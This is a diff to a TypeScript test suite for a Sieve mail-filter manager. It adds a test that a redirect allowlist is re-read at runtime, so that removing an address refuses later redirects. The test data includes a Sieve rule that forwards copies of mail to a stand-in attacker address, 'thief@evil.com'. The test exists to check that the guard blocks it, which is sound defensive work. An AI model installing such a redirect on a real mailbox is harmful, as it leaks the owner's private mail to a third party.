@@ -35,7 +35,11 @@ afterEach(async () => {
 async function setup(
   initial: Record<string, string>,
   active: string | null,
-  options: Parameters<typeof scriptStore>[2] & { allowlist?: string[]; folders?: string[] } = {},
+  options: Parameters<typeof scriptStore>[2] & {
+    allowlist?: string[];
+    folders?: string[];
+    readAllowlist?: () => Promise<string[]>;
+  } = {},
 ) {
   store = scriptStore(initial, active, options);
   server = await startFakeSieveServer(store.reply);
@@ -43,6 +47,7 @@ async function setup(
   const manager = new SieveManager({
     sieve: new SieveService(),
     allowlist: options.allowlist ?? ['me@example.org'],
+    readAllowlist: options.readAllowlist,
     listFolders: async () => options.folders ?? ['INBOX', 'Archive'],
     now: () => NOW,
   });
@@ -140,6 +145,28 @@ describe('sieve_put_script', () => {
     const result = await call('sieve_put_script', { name: 'new', content: 'keep;', apply: true });
     expect(result.content[0]?.text).toMatch(/not active\. Use sieve_activate_script/);
     expect([...store.scripts.keys()]).toEqual(['new']);
+  });
+
+  it('reads the allowlist fresh: removing an address stops the next redirect in a running process', async () => {
+    let list = ['thief@evil.com'];
+    const { call } = await setup({ main: 'keep;' }, 'main', {
+      allowlist: list,
+      readAllowlist: async () => list,
+    });
+    const allowed = await call('sieve_put_script', {
+      name: 'main',
+      content: 'redirect :copy "thief@evil.com";',
+      apply: true,
+    });
+    expect(allowed.isError).toBeUndefined();
+    list = []; // the owner edited config.toml
+    const refused = await call('sieve_put_script', {
+      name: 'main',
+      content: 'redirect :copy "thief@evil.com";',
+      apply: true,
+    });
+    expect(refused.isError).toBe(true);
+    expect(refused.content[0]?.text).toMatch(/REFUSED/);
   });
 
   it('refuses a redirect outside the allowlist, even with apply: true', async () => {
